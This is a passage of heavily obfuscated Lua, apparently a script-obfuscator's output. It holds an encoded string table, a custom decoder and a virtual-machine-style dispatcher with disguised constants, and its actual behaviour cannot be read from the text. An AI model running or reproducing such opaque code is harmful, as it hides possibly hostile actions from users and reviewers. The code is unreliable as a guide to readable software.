077\086\121\082\102\048\122\098\061\061";"\052\089\109\057\102\052\075\074\122\106\111\072\068\106\104\061","","\116\116\077\049\081\114\085\084\069\084\102\119\111\083\070\065\097\080\118\065\073\099\085\120","\056\067\122\108\081\103\120\090\088\074\112\073\090\105\070\101\057\081\080\099\049\075\079\077\089\069\061\061","\112\082\088\082\073\100\106\119\119\089\066\084\107\119\083\109\050\100\112\061","\106\119\112\110\102\106\047\097\088\079\069\087\053\102\087\071\065\107\111\067\105\085\090\120\054\071\048\114\121\047\077\061","\052\089\109\088\068\115\075\118\099\098\061\061","\070\114\118\068\120\085\066\097\069\043\121\114\074\081\121\061";"\106\070\099\073\068\043\081\066\122\070\099\074\055\069\061\061";"\047\055\067\067\056\113\115\051\066\113\121\120\102\075\090\099\068\051\120\106\121\048\078\070";"\053\056\114\084\057\122\118\073\085\117\121\050\082\077\068\081\105\051\122\099\083\075\098\061","\119\078\121\115\049\085\085\068\076\118\047\087\115\073\051\107\106\084\073\109\088\085\077\053\082\053\099\070";"\121\118\115\087\113\084\088\053\067\043\079\098\118\053\081\086\077\073\099\068\097\073\081\097\050\109\112\103\074\077\108\050\068\066\082\106\056\110\120\119\079\111\101\119\103\103\057\085\106\099\114\116\102\116\079\081\107\072\079\071\103\121\097\048\120\081\067\101\113\107\089\057\056\105\076\085\077\081\110\117\120\111\088\065\053\054\100\050\099\111\055\117\071\111\098\061","\048\065\101\084\079\114\088\050\104\049\114\056\084\052\090\110\057\071\052\076\097\104\055\061","\072\088\099\066\056\113\120\103\115\043\077\090\112\106\113\067","\118\105\050\103\121\069\103\069\073\113\074\077\113\049\108\116\099\077\052\115\113\098\061\061","\115\072\071\065\108\076\052\100\056\052\104\097\053\070\115\050\120\074\082\078\056\067\051\061","\052\115\086\083\076\050\055\100\049\078\113\050\048\055\056\068\107\082\101\066","\068\116\108\061";"\097\089\074\048\068\087\079\119\066\118\102\100\122\104\089\108\082\118\077\061","\101\082\105\078\114\050\103\049\107\068\085\109\077\083\078\047\065\080\081\048\068\074\079\051";"\102\107\097\100\102\107\097\081\122\055\061\061","\119\078\052\049\065\098\119\116\084\089\104\061","\089\068\084\104\119\101\049\086\070\114\049\075\112\106\054\098\083\105\080\066\084\055\061\061","\102\113\079\103\075\104\057\106\054\100\111\057\068\105\088\053","\099\118\122\052\097\052\085\071\070\107\057\050\071\100\089\067";"\113\065\055\083\100\107\043\051\065\078\086\051\101\069\061\061","\080\071\069\097\118\117\087\051\085\101\066\080\073\100\049\081\121\122\081\105\108\069\061\061","\117\054\052\102\121\067\054\061";"\102\113\118\081\106\112\066\056\105\081\057\065\066\083\050\118\050\048\103\099\049\098\087\101","\054\073\070\073\098\108\099\070\116\054\098\106\066\101\122\043","\071\053\065\120\099\115\080\047\102\087\102\069\070\116\111\082","\067\090\118\051\071\080\049\081\111\112\061\061";"\080\099\121\056\070\056\112\120\068\105\083\077\043\083\097\106\074\112\061\061","\066\065\086\065\047\075\110\116\088\051\077\120\075\082\050\054\085\103\108\083\066\055\051\061";"\082\052\067\102\077\103\108\103\069\101\117\107\115\070\057\086\070\121\106\056\104\100\081\057\108\104\077\061";"\067\109\109\114\048\068\072\055\111\083\107\119\100\073\065\100\112\048\076\069\115\121\101\111\112\112\061\061";"\068\066\111\100\071\098\061\061";"\120\056\081\089\083\072\112\079","\082\116\087\109\109\089\071\112\105\077\047\084\067\100\051\070\112\104\114\052\113\098\061\061";"\099\047\090\118\117\116\121\113\111\072\097\053\090\122\080\104\078\090\099\122\115\102\078\061";"\104\055\079\097\049\057\107\056\075\112\070\073\114\106\109\069\053\077\121\102\070\086\111\048";"\122\066\080\069\121\066\085\073";"\069\067\066\047\119\054\051\082\114\106\117\108\109\107\114\053\122\119\086\070\067\108\050\056\053\056\081\118\078\121\078\061";"\051\113\088\113\051\087\111\073\051\069\061\061";"\069\109\090\112\070\109\113\065\102\069\053\084\111\117\083\097\053\055\104\117\115\099\108\061";"\089\054\079\119\120\065\119\113\075\097\071\053\065\085\069\104\115\117\070\083\098\113\048\072","\114\048\110\078\048\090\085\073\114\065\079\049\073\112\061\061","\118\085\104\098\101\075\090\070\117\122\051\084","\077\089\067\043\097\051\115\083\051\051\048\075\053\105\086\061";"\105\109\066\112\107\114\067\080\056\100\108\076\073\098\110\104\051\100\056\099\085\057\086\061";"\068\106\097\081";"\051\115\111\081\102\106\109\057";"\049\055\061\061";"\099\115\080\101\097\053\051\100\102\066\112\089\071\105\097\072","\110\120\053\109\052\102\049\086\065\099\054\051\071\073\114\100\120\051\082\110\105\049\071\076\102\112\061\061","\120\067\065\104\068\055\104\087\043\080\048\077\079\120\090\055\089\055\082\069\088\114\100\061";"\102\107\089\074\122\106\085\101","\079\114\066\076\083\070\079\055\072\122\120\119\108\072\048\118\081\071\106\084\049\083\097\053\084\100\112\100\121\055\061\061";"\102\049\072\114\050\106\116\043\106\099\053\053\065\055\051\111\085\053\108\108\072\055\061\061";"\104\116\079\116\099\118\103\047\051\082\077\048\070\115\053\100\051\112\061\061"}for N,t in ipairs({{-62424+62425,-959332+959456},{633773-633772;-289785-(-289830)};{-501064+501110;619302-619178}})do while t[736762-736761]<t[1012571-1012569]do Z[t[-213622-(-213623)]],Z[t[359449-359447]],t[406588+-406587],t[538563+-538561]=Z[t[944146-944144]],Z[t[-607282+607283]],t[968449+-968448]+(219359-219358),t[781009-781007]-(1025338+-1025337)end end local function N(N)return Z[N+(903403-900011)]end do local N=string.char local t=string.sub local e=Z local v=string.len local r=table.insert local g={U=-433254+433267,E=-202087-(-202135),Q=1026931-1026885,r=250059-249999;f=-636826-(-636851);u=-136434-(-136465);["\048"]=871750+-871699;["\049"]=705687-705673,K=-291569+291586,J=-145264+145297;B=80146+-80124;o=-861065-(-861070);c=59534+-59504;["\052"]=-582047+582070;d=-24954+25006;C=-1004685-(-1004695);A=-242334-(-242383);I=-170625+170668,["\054"]=499061-499049,["\055"]=-224989+225021,n=296120-296057,["\056"]=-363798-(-363857);V=379141-379085;D=-642371-(-642398),S=305903+-305861;q=264924+-264885;m=959636+-959575;t=324125-324122;G=648497-648471,p=2351+-2335,l=-879294+879298,i=547050+-546995;y=-843791+843815;M=-193225-(-193233),X=630256-630215,Z=986820+-986773;["\050"]=749255-749244,e=-102450-(-102490),L=-330725-(-330783);w=651074-651067;h=299632+-299612;T=977038-976976,["\057"]=-192899+192944;N=-151781+151825;["\051"]=-463610-(-463638);Y=293624+-293571,b=-630825-(-630825);["\043"]=457524-457509;g=-784774-(-784775);["\053"]=-937831-(-937867);R=-195851+195870,s=244229-244191;W=684034-683999;H=3785+-3751;z=283969+-283940,O=-832768-(-832777);a=828831-828810;x=-521033-(-521035);P=1028785+-1028728;v=592725-592688,["\047"]=-53974-(-54024),k=-609726+609780;j=1015987-1015981;F=-798055-(-798073)}local M=table.concat local F=math.floor local k=type for Z=-680833-(-680834),#e,-684712+684713 do local w=e[Z]if k(w)=="\115\116\114\105\110\103"then local k=v(w)local b={}local C=108717+-108716 local A=-791187+791187 local j=21673-21673 while C<=k do local Z=t(w,C,C)local e=g[Z]if e then A=A+e*(-175222+175286)^((-811116-(-811119))-j)j=j+(426291-426290)if j==-687550-(-687554)then j=545181-545181 local Z=F(A/(915191+-849655))local t=F((A%(1021357+-955821))/(102534+-102278))local e=A%(-849926-(-850182))r(b,N(Z,t,e))A=-757409-(-757409)end elseif Z=="\061"then r(b,N(F(A/(1009753-944217))))if C>=k or t(w,C+(255437+-255436),C+(832434-832433))~="\061"then r(b,N(F((A%(-354627+420163))/(942302-942046))))end break end C=C+(334607+-334606)end e[Z]=M(b)end end end return(function(Z,e,v,r,g,M,F,j,K,w,B,f,i,C,t,b,k,A,L,d,h)C,d,K,h,k,B,A,i,t,w,b,L,j,f=-419301+419301,function(Z,N)local e=A(N)local v=function(v,r,g,M,F)return t(Z,{v,r,g;M;F},N,e)end return v end,function(Z,N)local e=A(N)local v=function(v)return t(Z,{v},N,e)end return v end,function(Z,N)local e=A(N)local v=function(v,r)return t(Z,{v,r},N,e)end return v end,{},function(Z,N)local e=A(N)local v=function(...)return t(Z,{...},N,e)end return v end,function(Z)for N=96706-96705,#Z,1023271+-1023270 do w[Z[N]]=w[Z[N]]+(200749+-200748)end if v then local t=v(true)local e=g(t)e[N(554163-557440)],e[N(834794+-838136)],e[N(18037-21331)]=Z,j,function()return-998202+623438 end return t else return r({},{[N(-17122+13780)]=j;[N(723217+-726494)]=Z,[N(612314-615608)]=function()return-605508-(-230744)end})end end,function(Z,N)local e=A(N)local v=function()return t(Z,{},N,e)end return v end,function(t,v,r,g)local CT={}local E,gp,Ap,Np,a,V,jp,A,bT,U,NT,Gp,Xp,C,D,Wp,Q,rp,Rp,P,x,Sp,y,up,bp,op,z,qp,tp,np,tT,ap,Vp,Ip,Pp,kp,sp,Dp,dp,c,p,S,Fp,T,H,J,MT,B,Up,wT,lp,q,l,m,F,O,ep,w,zp,Kp,Cp,Lp,ip,Hp,Tp,yp,Jp,Yp,vp,Ep,Mp,xp,X,R,s,vT,u,FT,Zp,eT,wp,rT,gT,Bp,cp,Qp,G,pp,W,fp,kT,Y,I,ZT,hp,n,o,j,Op,mp while t do if t<7609584-49284 then if t<853309+3332762 then if t<1597239-(-667466)then if t<2993331-1047987 then if t<869851-(-88255)then if t<919227+-185687 then if t<531833-272411 then t=458439+3898731 else t=true t=t and 13616946-235561 or 231820+15642481 end else Fp=-208848+15665177988174 G=nil X=nil yp=N(359986-363321)CT[1025159-1025146]=335042+6937594261468 FT=1004475+18346809183652 Bp=14930641780931-(-236133)t=Z[N(-941878+938592)]CT[-481383+481391]=N(501311-504638)zp=768903+10401751390052 R=b()CT[-306749-(-306786)]=-861957+762724690024 Y=N(-188910+185633)Sp=-925672+8297954979584 T=N(225781+-229064)Xp=N(-594494+591182)wp=31427239603719-(-871203)V={}Dp=N(-361639+358296)W=b()k[R]=V y=h(6730942-559860,{R,n;x;B})CT[162419+-162414]=-798121+27307186937684 B=f(B)ep=N(-450773-(-447447))CT[746274-746268]=N(-732415-(-729105))CT[-725221+725264]=9060676835823-(-1046156)CT[-590359+590415]=N(436268-439613)CT[-210739-(-210757)]=N(391990+-395290)sp=N(-554502-(-551153))s=nil CT[-217250+217282]=N(-1010125+1006758)G=N(689796+-693117)V=b()Up=N(171646+-174927)k[V]=y B=N(680871+-684257)CT[997282-997238]=N(709342+-712733)ap=22445998511782-(-447022)tp=609564+12526596229549 m=N(-325739+322422)y={}z={}o=N(592811+-596179)c=nil k[W]=y kp=N(-579939+576587)q=N(-914637+911303)y=Z[m]kT=N(418016-421352)Np=N(-809498+806117)CT[753316+-753307]=310472+22475916291098 H=k[W]P={[Y]=H;[T]=s}cp=13184012292453-(-444054)fp=N(-177042-(-173764))m=y(z,P)y=L(71325+2091536,{W,R,E;n,x;V})W=f(W)V=f(V)R=f(R)j=nil x=f(x)Cp=21645902139453-(-710434)E=f(E)C=y Yp=-709512+7830799966662 CT[384291+-384274]=48217+20493153790189 Lp=N(360335-363660)D=nil j=Z[B]hp=1866929275152-(-115285)n=f(n)A=m c=32302974425275-(-352775)gp=258139+10336194339442 l=nil x=936947+9917394585111 W=N(-907406+904105)Ip=29644509769240-456748 ip=6724435997560-(-956611)B=j()Ep=-791179+32981205061257 CT[163680+-163661]=8804523133432-(-853515)CT[-43888+43921]=843860+29134529926314 CT[282859-282829]=N(167830+-171196)CT[149403-149376]=437616+6688531373754 X=C(G,c)j=A[X]CT[1020948-1020897]=202023+15793346725779 n=21147155979974-538703 Tp=-170082+30042243272455 c=N(-3497+226)G=C(c,n)X=A[G]B[j]=X gT=-196160+32873157392907 B=N(-237959-(-234573))c=28002646059182-472511 j=Z[B]Jp=N(-483328+480056)T=-884715+19112112759470 n=N(149010+-152297)CT[-247791+247812]=12245179044448-621594 B=j()G=N(-921973+918629)X=C(G,c)G=N(1001696+-1005059)CT[319533-319493]=N(701086+-704389)Ap=N(-38803-(-35496))j=A[X]CT[-27851-(-27887)]=N(527588+-530978)CT[648913-648891]=N(-674263-(-670967))X=Z[G]CT[-727264+727318]=N(5978-9355)wT=16970991235396-(-306586)B[j]=X B=N(-989780-(-986394))CT[-750320-(-750355)]=282629+28920257193110 G=N(874347-877622)j=Z[B]D=N(598191+-601496)dp=N(48801-52174)I=757281+4406811785699 c=856650+9822231297939 rT=N(-48066+44686)B=j()X=C(G,c)rp=N(817252-820624)G=N(-324800-(-321443))j=A[X]c=1044931+26642135596723 X=995503+-995502 s=N(722847+-726144)B[j]=X Rp=N(-452344+449005)B=N(564301+-567687)up=N(-226538-(-223245))CT[-946094+946144]=N(888126+-891400)P=N(522433-525807)l=N(-124185-(-120824))E=-661358+33080574661530 H=N(-80707-(-77439))j=Z[B]CT[9392+-9334]=N(273452+-276810)V=22162626988983-(-351385)NT=N(-724037+720652)O=1018374+13669821697751 Kp=N(86831-90160)CT[105186-105185]=10215382767651-837007 R=N(445626+-448911)B=j()vp=7886238232744-205392 X=C(G,c)j=A[X]bp=N(-196169-(-192829))X=-360842-(-360844)CT[265381+-265334]=18606013551814-(-691474)B[j]=X B=N(-856110+852724)c=404414+20569171999148 j=Z[B]G=N(1014133+-1017481)B=j()Hp=N(840463+-843847)CT[618202+-618179]=33677166323488-(-267810)X=C(G,c)Wp=7871+20124847572444 j=A[X]c=C(n,x)z=-936767+21346556195347 G=A[c]y=-828015+35154387706465 CT[581521+-581495]=N(-1039299+1035940)c=true x=C(l,E)n=A[x]x=true CT[609381+-609333]=N(51433-54709)E=C(D,V)qp=N(-890210+886877)l=A[E]E=true V=C(R,y)Op=29993426001770-(-595748)D=A[V]CT[828814-828757]=143171+13482131876163 Qp=169375+30012257706232 y=C(W,z)bT=N(-193761-(-190455))V=true R=A[y]Q=N(-267686+264356)CT[277981-277928]=-423171+32546012327990 u=799917+18055180528682 Y=378978+24394279609341 y=true z=C(P,Y)Vp=1030866+10302614378475 W=A[z]MT=N(-779768+776404)pp=423924+18943987182209 lp=N(-333402+330040)z=true Y=C(H,T)P=A[Y]CT[-850041-(-850069)]=N(337879+-341250)Y=true T=C(s,u)H=A[T]T=true CT[675853+-675811]=N(285013+-288311)u=C(Q,O)CT[-684691+684702]=13768717113601-229366 s=A[u]u=true op=N(77291-80666)O=C(o,I)Q=A[O]vT=12515317656227-(-879648)CT[751881-751832]=3520814681476-(-407779)O=true CT[809759-809739]=N(322776+-326049)Gp=10022992235592-326157 Zp=4455672802375-(-187347)I=C(q,Zp)mp=N(-124238-(-120851))o=A[I]I=true CT[410480-410466]=N(957669-960939)jp=16241406039303-(-936067)Zp=C(Np,tp)q=A[Zp]Zp=true tp=C(ep,vp)Np=A[tp]tp=true vp=C(rp,gp)ep=A[vp]vp=true Mp=N(-905292+901951)gp=C(Mp,Fp)rp=A[gp]Fp=C(kp,wp)Mp=A[Fp]gp=true Fp=true xp=N(-27702-(-24413))wp=C(bp,Cp)eT=N(-391767-(-388416))kp=A[wp]wp=true Cp=C(Ap,jp)CT[678111-678101]=N(210479+-213778)bp=A[Cp]Cp=true jp=C(fp,Bp)Ap=A[jp]CT[747691-747652]=-666535+1780958605028 Bp=C(dp,ip)CT[-990577+990618]=906320+23778127566576 fp=A[Bp]Bp=true ip=C(Kp,hp)ZT=19203335167207-686585 jp=true dp=A[ip]hp=C(Lp,Gp)ip=true Kp=A[hp]np=-611520+29627726088868 Gp=C(Xp,cp)hp=true Lp=A[Gp]Gp=true cp=C(xp,Ep)tT=88256+13939997556891 Xp=A[cp]Ep=C(lp,np)xp=A[Ep]np=C(Dp,Vp)lp=A[np]Vp=C(Rp,pp)cp=true CT[-129021-(-129028)]=895944+25880558830411 Ep=true CT[117149-117125]=N(988616-991896)np=true Dp=A[Vp]CT[-334086-(-334124)]=N(768731-772023)pp=C(Jp,ap)Vp=true Rp=A[pp]pp=true CT[853345+-853330]=2222186514298-880 ap=C(yp,Wp)Pp=N(-466071-(-462767))Jp=A[ap]ap=true Wp=C(mp,zp)yp=A[Wp]Wp=true CT[-917811-(-917842)]=25545344240245-465918 zp=C(Pp,Yp)mp=A[zp]Yp=C(Hp,Tp)zp=true Pp=A[Yp]Tp=C(sp,Sp)CT[-896868-(-896880)]=N(-779186-(-775826))Hp=A[Tp]Yp=true Tp=true Sp=C(up,Op)sp=A[Sp]Sp=true Op=C(op,Qp)CT[861318+-861293]=322186+6601355829623 up=A[Op]Op=true Qp=C(Up,Ip)op=A[Qp]Qp=true Ip=C(qp,ZT)Up=A[Ip]ZT=C(NT,tT)Ip=true qp=A[ZT]tT=C(eT,vT)CT[741927-741924]=26233049003561-771698 ZT=true NT=A[tT]vT=C(rT,gT)eT=A[vT]tT=true gT=C(MT,FT)rT=A[gT]vT=true gT=true FT=C(kT,wT)MT=A[FT]FT=true wT=C(bT,CT[266180+-266179])kT=A[wT]CT[752678+-752676]=N(694040-697309)wT=true CT[-487232+487233]=C(CT[-788710-(-788712)],CT[-554292+554295])bT=A[CT[519573-519572]]CT[381611-381607]=N(-626605-(-623326))CT[258939+-258936]=C(CT[-954633+954637],CT[288144-288139])CT[610927+-610872]=838795+16036132802720 CT[-819675+819677]=A[CT[-438582+438585]]CT[646009+-646004]=C(CT[669092-669086],CT[-977292+977299])CT[213734-213705]=-854931+8795410750354 CT[-947645-(-947646)]=true CT[92986+-92982]=A[CT[698348-698343]]CT[1043286-1043279]=C(CT[353298-353290],CT[278608+-278599])CT[-76680+76685]=true CT[-549207+549213]=A[CT[560919+-560912]]CT[-737502+737509]=true CT[-629151-(-629196)]=258481+31774384277531 CT[597334-597331]=true CT[781271-781262]=C(CT[599878+-599868],CT[-259849-(-259860)])CT[-115319-(-115365)]=N(109001+-112338)CT[509601+-509593]=A[CT[4004+-3995]]CT[443574-443565]=true CT[168605+-168594]=C(CT[975397-975385],CT[-17191+17204])CT[-984067+984127]=N(919366-922735)CT[-256895-(-256905)]=A[CT[-441303+441314]]CT[-184593-(-184606)]=C(CT[-825575+825589],CT[979964+-979949])CT[281221+-281205]=N(-393403-(-390024))CT[-927380+927439]=-165576+15708450153306 CT[-512045-(-512057)]=A[CT[-609179+609192]]CT[146724+-146709]=C(CT[-984958+984974],CT[-975259+975276])CT[495469+-495455]=A[CT[165951+-165936]]CT[-429649+429701]=N(286606+-289984)CT[355997+-355984]=true CT[2305+-2288]=C(CT[-97738-(-97756)],CT[-220641-(-220660)])CT[-1020212+1020228]=A[CT[-755719+755736]]CT[-582691-(-582706)]=true CT[-922665-(-922676)]=true CT[-537695+537712]=true CT[-264163-(-264182)]=C(CT[449684+-449664],CT[469576+-469555])CT[136272-136254]=A[CT[-757234-(-757253)]]CT[271996+-271975]=C(CT[92369+-92347],CT[-131696-(-131719)])CT[72895-72876]=true CT[-107986-(-108006)]=A[CT[-38816+38837]]CT[456267+-456246]=true CT[591739-591716]=C(CT[536774+-536750],CT[-588376+588401])CT[-717980-(-718002)]=A[CT[-451087-(-451110)]]CT[-647020-(-647045)]=C(CT[-105211+105237],CT[-687711+687738])CT[174737-174714]=true CT[83918+-83894]=A[CT[-667893+667918]]CT[-461343+461368]=true CT[-1036606-(-1036633)]=C(CT[-116625+116653],CT[-372313+372342])CT[-832726-(-832752)]=A[CT[-270019-(-270046)]]CT[14777+-14748]=C(CT[-605075-(-605105)],CT[-221237-(-221268)])CT[-817223+817250]=true CT[-893664+893725]=33007124705086-(-478412)CT[359488+-359460]=A[CT[964269+-964240]]CT[-252443+252474]=C(CT[-235152+235184],CT[-882147-(-882180)])CT[826898-826869]=true CT[-849606-(-849636)]=A[CT[401637+-401606]]CT[-858074+858105]=true CT[256450-256416]=N(-295473-(-292185))CT[119910-119877]=C(CT[342412-342378],CT[-250328+250363])CT[-460742+460774]=A[CT[-647938+647971]]CT[-298864+298899]=C(CT[-359914+359950],CT[309050-309013])CT[833918-833884]=A[CT[-822202+822237]]CT[-106740+106773]=true CT[488523+-488488]=true CT[984468+-984431]=C(CT[-223141+223179],CT[-632919-(-632958)])CT[-375786+375822]=A[CT[372728+-372691]]CT[636308+-636269]=C(CT[-151699-(-151739)],CT[-511176-(-511217)])CT[123165+-123128]=true CT[720554-720516]=A[CT[-699421+699460]]CT[621114+-621073]=C(CT[998900-998858],CT[891290+-891247])CT[1042846-1042807]=true CT[922546-922506]=A[CT[-181269-(-181310)]]CT[-574595+574636]=true CT[-733821+733864]=C(CT[-860243-(-860287)],CT[-939742+939787])F={}CT[942440-942398]=A[CT[155549+-155506]]CT[576320+-576275]=C(CT[-303130-(-303176)],CT[868421-868374])CT[624102+-624058]=A[CT[394730+-394685]]CT[1008609-1008566]=true CT[-920084+920129]=true CT[-163354-(-163401)]=C(CT[157000-156952],CT[379496+-379447])CT[-104625+104671]=A[CT[273629+-273582]]CT[357885+-357836]=C(CT[-981076+981126],CT[-751526+751577])CT[225851-225803]=A[CT[-98371+98420]]CT[694389+-694340]=true CT[900358+-900311]=true CT[436249-436198]=C(CT[-480062+480114],CT[816811-816758])CT[667483-667433]=A[CT[-244+295]]CT[463160+-463107]=C(CT[111379-111325],CT[-89077+89132])CT[-925139-(-925191)]=A[CT[1046067-1046014]]CT[-797575-(-797626)]=true CT[796640-796585]=C(CT[880077-880021],CT[250257+-250200])CT[869903-869850]=true CT[-100351+100405]=A[CT[404773+-404718]]CT[-232715-(-232772)]=C(CT[452966+-452908],CT[-461959+462018])CT[733175+-733119]=A[CT[603520+-603463]]CT[-424396-(-424453)]=true CT[-337351+337410]=C(CT[-371781-(-371841)],CT[782142+-782081])CT[-718436-(-718491)]=true CT[844896-844838]=A[CT[702218-702159]]CT[-225458-(-225517)]=true C=nil X={[G]=c,[n]=x;[l]=E,[D]=V;[R]=y;[W]=z,[P]=Y;[H]=T,[s]=u,[Q]=O;[o]=I;[q]=Zp;[Np]=tp,[ep]=vp,[rp]=gp;[Mp]=Fp,[kp]=wp,[bp]=Cp;[Ap]=jp;[fp]=Bp,[dp]=ip;[Kp]=hp;[Lp]=Gp;[Xp]=cp,[xp]=Ep,[lp]=np;[Dp]=Vp,[Rp]=pp;[Jp]=ap,[yp]=Wp,[mp]=zp,[Pp]=Yp,[Hp]=Tp,[sp]=Sp;[up]=Op,[op]=Qp;[Up]=Ip;[qp]=ZT;[NT]=tT;[eT]=vT,[rT]=gT;[MT]=FT;[kT]=wT;[bT]=CT[-492352+492353];[CT[667861-667859]]=CT[368299+-368296];[CT[560954+-560950]]=CT[-288131-(-288136)];[CT[-675744-(-675750)]]=CT[-297565-(-297572)];[CT[-17868-(-17876)]]=CT[-364453+364462];[CT[-427335-(-427345)]]=CT[-246212+246223],[CT[-89381-(-89393)]]=CT[946701+-946688];[CT[36183+-36169]]=CT[963721+-963706],[CT[422937+-422921]]=CT[-130236+130253];[CT[936816+-936798]]=CT[823257-823238],[CT[-563518+563538]]=CT[-123900+123921],[CT[963641+-963619]]=CT[-423824-(-423847)];[CT[-713309+713333]]=CT[576746-576721];[CT[-815266-(-815292)]]=CT[-876944+876971];[CT[810699-810671]]=CT[476182-476153],[CT[846537-846507]]=CT[4270+-4239];[CT[-515129+515161]]=CT[531805+-531772];[CT[919490+-919456]]=CT[-569231-(-569266)];[CT[-967904-(-967940)]]=CT[106576-106539];[CT[1006459-1006421]]=CT[201993-201954],[CT[121760+-121720]]=CT[-48578+48619];[CT[-406035-(-406077)]]=CT[370041-369998],[CT[-774455-(-774499)]]=CT[732933-732888],[CT[-412293-(-412339)]]=CT[12780+-12733],[CT[-586250-(-586298)]]=CT[684770+-684721],[CT[386905+-386855]]=CT[489394+-489343],[CT[843879+-843827]]=CT[380959-380906],[CT[906693+-906639]]=CT[-787341+787396],[CT[924756-924700]]=CT[691335+-691278];[CT[788952+-788894]]=CT[-1025083+1025142]}A=nil B[j]=X end else if t<2056774-207900 then C=N(-443390-(-440081))A=-403532+15421825 w=C^A F=4058371-836322 t=F-w w=t F=N(-177842+174466)t=F/w F={t}t=Z[N(851994+-855278)]else A=873460+-873239 C=k[r[-689150-(-689152)]]w=C*A C=31114273973160-(-890095)F=w+C C=-939907+939908 w=-96760+35184372185592 t=F%w k[r[17997-17995]]=t w=k[r[336932-336929]]t=7388620-(-446251)F=w~=C end end else if t<1652342-(-590843)then if t<-658110+2884006 then C=v[-1030808+1030810]w=v[748109+-748108]t=k[r[-14888-(-14889)]]A=t t=A[C]t=t and 1952255-(-305559)or 4944084-720339 else t=Z[N(1030319+-1033707)]F={C}end else if t<2125394-(-129881)then y=N(935600+-938911)t=Z[y]y=N(-510500-(-507111))Z[y]=t t=3384443-959120 else t=988289+1254717 end end end else if t<1972375-(-918689)then if t<3331726-913026 then if t<3131342-726216 then if t<2424181-98793 then G=N(478227-481597)E=N(-634774-(-631483))X=F F=Z[G]G=N(749166-752521)t=F[G]G=b()c=N(-123386+120095)k[G]=t F=Z[c]c=N(-812599-(-809291))t=F[c]l=Z[E]c=t n=l x=t t=l and 6595663-(-686698)or 12748942-797026 else t=S t=3714942-645392 F=U end else t=529752+8122298 V=R z=V D[V]=z V=nil end else if t<-553705+3423340 then t=-89123-(-560819)else R=416171+-416170 y=#D V=j(R,y)z=-623537-(-623538)R=X(D,V)y=k[E]m=R-z V=nil t=12961243-(-983999)W=G(m)y[R]=W R=nil end end else if t<-395530+4296750 then if t<3637914-465038 then t=8768151-(-1031552)k[C]=F else s=877635-877634 S=T[s]U=S t=7291601-(-544554)end else if t<-514006+4591148 then t=K(658667+7999221,{j})J={t()}t=Z[N(-736894+733541)]F={e(J)}else F=N(-150503-(-147179))t=Z[F]w=N(66784+-70102)F=t(w)F={}t=Z[N(918655-921971)]end end end end else if t<1033843+4846950 then if t<752341+4071952 then if t<698486+3713164 then if t<225357+4110981 then if t<4280457-(-23641)then t={}k[r[-793330+793332]]=t B=35184371455512-(-633320)G=336128+-335873 F=k[r[-1015451+1015454]]j=F F=C%B c=N(365815-369105)k[r[-862357+862361]]=F X=C%G G=807136-807134 B=X+G k[r[414904-414899]]=B t=-62978+10958035 G=Z[c]c=N(883415+-886771)X=G[c]G=X(w)X=N(-211898-(-208616))n=G x=668616-668615 c=-118822-(-118823)A[C]=X X=326741-326599 l=x x=-494893+494893 E=l<x x=c-l else J=l==E t=95053+10921219 a=J end else c=nil t=642376+8009674 l=nil B=f(B)C=f(C)D=nil C=nil x=f(x)E=nil D={}G=f(G)j=f(j)n=f(n)V=nil A=f(A)A=nil l={}X=nil G=N(-510095-(-506725))R=f(R)X=N(860705+-864075)B=Z[X]X=N(136530+-139849)c=N(-592220-(-588929))V=-308252+308253 j=B[X]B=b()k[B]=j X=Z[G]G=N(290313-293668)j=X[G]G=Z[c]n=N(-255345+252055)c=N(-1026545+1023243)X=G[c]c=Z[n]n=N(-866856-(-863528))G=c[n]n=b()R=-624762-(-625018)c=-1017446+1017446 x=b()k[n]=c c=511310-511308 E=b()k[x]=c y=R c={}k[E]=l l=222387-222387 R=1039354-1039353 W=R R=-400951-(-400951)m=W<R R=V-W end else if t<381872+4128840 then t=k[r[-643916-(-643923)]]t=t and-839867+6725831 or 5028876-277813 else A=k[r[822112+-822103]]j=A t={}C=-907795-(-907796)A=523258+-523257 w=t B=A t=17300592-872171 A=-56524-(-56524)X=B<A A=C-B end end else if t<6385464-700142 then if t<-498037+6144308 then a=a+p W=not y F=a<=J F=W and F W=a>=J W=y and W F=W or F W=8849985-(-929557)t=F and W F=-13183+11886709 t=t or F else C=k[r[-476821+476824]]n=-389254-(-389256)A=-257832-(-257864)w=C%A j=k[r[-925678-(-925682)]]l=742701-742688 G=k[r[189540+-189538]]V=k[r[-400378+400381]]D=V-w V=-513508+513540 E=D/V x=l-E c=n^x X=G/c B=j(X)c=962212+-962211 l=-149609-(-149865)j=4294890623-(-76673)A=B%j B=259681-259679 j=B^w C=A/j j=k[r[-273087+273091]]G=C%c c=615207+4294352089 w=nil X=G*c B=j(X)j=k[r[-31447-(-31451)]]X=j(C)A=B+X B=-696295-(-761831)n=788890-788634 j=A%B G=-548479-(-614015)X=A-j B=X/G G=-863947-(-864203)X=j%G c=j-X G=c/n n=489795+-489539 c=B%n x=B-c n=x/l j=nil x={X,G,c,n}C=nil n=nil t=-143974+16186158 B=nil G=nil A=nil k[r[-39332+39333]]=x X=nil c=nil end else if t<5166236-(-643248)then p=N(-1408+-1938)W=N(479223-482612)t=Z[p]y=Z[W]p=t(y)t=N(1032986-1036297)Z[t]=p t=-254336+2679659 else t=true t=t and 14539257-328745 or 9986533-(-845034)end end end else if t<-583108+7224811 then if t<-727870+7095280 then if t<-407025+6542985 then if t<743942+5305168 then A=330153-330153 w=N(341359-344683)t=Z[w]C=k[r[962693+-962685]]w=t(C,A)t=-566787+5317850 else n=490401+-490146 t=k[r[942748-942747]]C=A c=234347-234347 G=t(c,n)w[C]=G C=nil t=461086+15967335 end else w=k[r[-659757+659758]]F=#w w=350475+-350475 t=F==w t=t and 2205060-313539 or 16371458-329274 end else if t<5653377-(-849298)then t=673324+1642647 X=k[B]F=X else p=N(864041-867331)c=x J=Z[p]p=N(409386-412699)a=J[p]J=a(w,c)c=nil a=k[r[1016447-1016441]]p=a()R=J+p V=R+X R=318879-318623 D=V%R R=A[C]X=D p=-789881-(-789882)J=X+p a=j[J]V=R..a t=11544545-649488 A[C]=V end end else if t<8126682-880047 then if t<325124+6370700 then C=k[r[-118905-(-118907)]]t=304653+8059794 A=k[r[-540670-(-540673)]]w=C==A F=w else A=k[r[702200-702194]]C=A==w t=13223635-(-74597)F=C end else if t<6421138-(-879722)then D=N(-905271-(-901980))E=Z[D]t=983317+10968599 D=N(-185775+182410)l=E[D]n=l else n=b()x=147755+-147752 D=N(820187-823501)l=-748999-(-749064)k[n]=F t=k[G]F=t(x,l)p=N(-214974+211628)x=b()t=-533511+533511 k[x]=F l=t t=352776-352776 E=t 